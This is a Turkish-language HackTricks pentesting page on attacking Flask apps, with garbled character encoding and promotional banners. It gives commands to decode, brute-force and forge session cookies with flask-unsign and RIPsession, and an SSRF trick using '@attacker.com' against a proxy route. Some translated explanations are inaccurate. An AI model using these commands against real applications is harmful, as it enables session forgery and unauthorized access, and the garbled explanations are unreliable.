# Flask

<details>

<summary><strong>AWS hackleme becerilerinizi sÄ±fÄ±rdan kahraman seviyesine Ã§Ä±karÄ±n</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile</strong>!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

DÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturun ve otomatikleÅŸtirin** iÃ§in [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

**Muhtemelen bir CTF oynuyorsanÄ±z, bir Flask uygulamasÄ±** [**SSTI**](../../pentesting-web/ssti-server-side-template-injection/)** ile ilgili olacaktÄ±r.**

## Ã‡erezler

VarsayÄ±lan Ã§erez oturum adÄ± **`session`**'dÄ±r.

### Decoder

Ã‡evrimiÃ§i Flask Ã§erez Ã§Ã¶zÃ¼cÃ¼sÃ¼: [https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### Manuel

Ã‡erezin ilk noktaya kadar olan ilk kÄ±smÄ±nÄ± alÄ±n ve Base64 ile Ã§Ã¶zÃ¼n>
```bash
echo "ImhlbGxvIg" | base64 -d
```
Ã‡erez ayrÄ±ca bir ÅŸifre kullanÄ±larak imzalanÄ±r

### **Flask-Unsign**

Tahmin edilen gizli anahtarlarÄ± kullanarak bir Flask uygulamasÄ±nÄ±n oturum Ã§erezlerini almak, Ã§Ã¶zmek, brute-force yapmak ve oluÅŸturmak iÃ§in komut satÄ±rÄ± aracÄ±.

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **Ã‡erezin Åifresini Ã‡Ã¶zme**

Bir web uygulamasÄ±nda, bazen Ã§erezlerde saklanan bilgileri anlamak Ã¶nemli olabilir. Flask gibi bazÄ± web Ã§erÃ§eveleri, Ã§erezleri ÅŸifreleyerek saklar. Bu durumda, Ã§erezin ÅŸifresini Ã§Ã¶zmek iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. Ä°lk olarak, Ã§erezin deÄŸerini alÄ±n. Bu genellikle `document.cookie` kullanÄ±larak JavaScript tarafÄ±ndan yapÄ±lÄ±r.
2. ÅifrelenmiÅŸ Ã§erezin deÄŸerini alÄ±n ve Base64 Ã§Ã¶zÃ¼mlemesi yapÄ±n. Bu, ÅŸifrelenmiÅŸ veriyi orijinal haline dÃ¶nÃ¼ÅŸtÃ¼rmenizi saÄŸlar.
3. ÅifrelenmiÅŸ veriyi Ã§Ã¶zÃ¼mleyin. Flask gibi bir Ã§erÃ§eve kullanÄ±yorsanÄ±z, genellikle `itsdangerous` modÃ¼lÃ¼ kullanÄ±larak Ã§erezler ÅŸifrelenir. Bu modÃ¼lÃ¼ kullanarak Ã§erezin ÅŸifresini Ã§Ã¶zebilirsiniz.
4. Åifresi Ã§Ã¶zÃ¼lmÃ¼ÅŸ veriyi elde edin ve iÃ§eriÄŸini inceleyin. Bu, Ã§erezde saklanan bilgileri anlamanÄ±za yardÄ±mcÄ± olacaktÄ±r.

Bu adÄ±mlarÄ± takip ederek, ÅŸifrelenmiÅŸ bir Ã§erezin iÃ§eriÄŸini Ã§Ã¶zebilir ve Ã§erezde saklanan bilgilere eriÅŸebilirsiniz.
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **Brute Force (Kaba Kuvvet)**

Brute force saldÄ±rÄ±sÄ±, bir hedefin ÅŸifresini veya kimlik doÄŸrulama bilgilerini tahmin etmek iÃ§in tÃ¼m olasÄ± kombinasyonlarÄ± denemek amacÄ±yla kullanÄ±lan bir saldÄ±rÄ± yÃ¶ntemidir. Bu saldÄ±rÄ± yÃ¶ntemi, genellikle zayÄ±f veya tahmin edilebilir ÅŸifrelerin kullanÄ±ldÄ±ÄŸÄ± durumlarda etkili olabilir. Brute force saldÄ±rÄ±larÄ±, oturum aÃ§ma formlarÄ±nda, ÅŸifre korumalÄ± dosyalarda veya aÄŸ cihazlarÄ±nda kullanÄ±cÄ± adÄ± ve ÅŸifre kombinasyonlarÄ±nÄ± denemek iÃ§in kullanÄ±labilir. Bu saldÄ±rÄ± yÃ¶ntemi, tÃ¼m olasÄ± kombinasyonlarÄ± denemek iÃ§in bÃ¼yÃ¼k bir hesaplama gÃ¼cÃ¼ gerektirir ve genellikle zaman alÄ±cÄ± bir sÃ¼reÃ§tir.
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **Ä°mzalama**
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### Eski SÃ¼rÃ¼mlerle Ä°mzalama

Flask, eski sÃ¼rÃ¼mlerde kullanÄ±lan bir imzalama yÃ¶ntemine sahiptir. Bu yÃ¶ntem, `itsdangerous` kÃ¼tÃ¼phanesini kullanarak verileri imzalar. Bu imzalama yÃ¶ntemi, gÃ¼venlik aÃ§Ä±klarÄ±na neden olabileceÄŸi iÃ§in gÃ¼ncel sÃ¼rÃ¼mlerde Ã¶nerilmez. Ancak, bazÄ± durumlarda eski sÃ¼rÃ¼mlerle Ã§alÄ±ÅŸmak zorunda kalabilirsiniz.

Eski sÃ¼rÃ¼mlerde imzalama yapmak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. `itsdangerous` kÃ¼tÃ¼phanesini yÃ¼kleyin:

```bash
pip install itsdangerous==0.24
```

2. Ä°mzalama anahtarÄ±nÄ±zÄ± oluÅŸturun:

```python
from itsdangerous import URLSafeTimedSerializer

secret_key = "your_secret_key"
serializer = URLSafeTimedSerializer(secret_key)
```

3. Verileri imzalayÄ±n:

```python
data = "your_data"
signed_data = serializer.dumps(data)
```

4. Ä°mzalÄ± veriyi doÄŸrulayÄ±n:

```python
original_data = serializer.loads(signed_data)
```

Bu yÃ¶ntemle imzalanan veriler, `itsdangerous` kÃ¼tÃ¼phanesinin eski sÃ¼rÃ¼mlerinde doÄŸrulanabilir. Ancak, gÃ¼venlik aÃ§Ä±klarÄ± nedeniyle bu yÃ¶ntemi kullanmaktan kaÃ§Ä±nmanÄ±z Ã¶nerilir.
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

Flask-unsign ile oluÅŸturulan Ã§erezler kullanarak web sitelerini brute-force etmek iÃ§in komut satÄ±rÄ± aracÄ±.

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### Flask session Ã§erezinde SQLi, SQLmap ile

[**Bu Ã¶rnek**](../../pentesting-web/sql-injection/sqlmap/#eval), bilinen bir sÄ±r kullanarak Flask iÃ§in sqlmap payloadlarÄ±nÄ± otomatik olarak imzalamak iÃ§in sqlmap `eval` seÃ§eneÄŸini kullanÄ±r.

## Flask Proxy ile SSRF

[**Bu yazÄ±da**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies), Flask'Ä±n "@" karakteri ile baÅŸlayan bir isteÄŸi nasÄ±l kabul ettiÄŸi aÃ§Ä±klanmaktadÄ±r.
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
AÅŸaÄŸÄ±daki senaryoda hangisi:
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
**SSRF**'ye neden olmak iÃ§in "@attacker.com" gibi bir ÅŸeyi tanÄ±tmaya izin verilebilir.

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturun ve otomatikleÅŸtirin.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklam vermek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
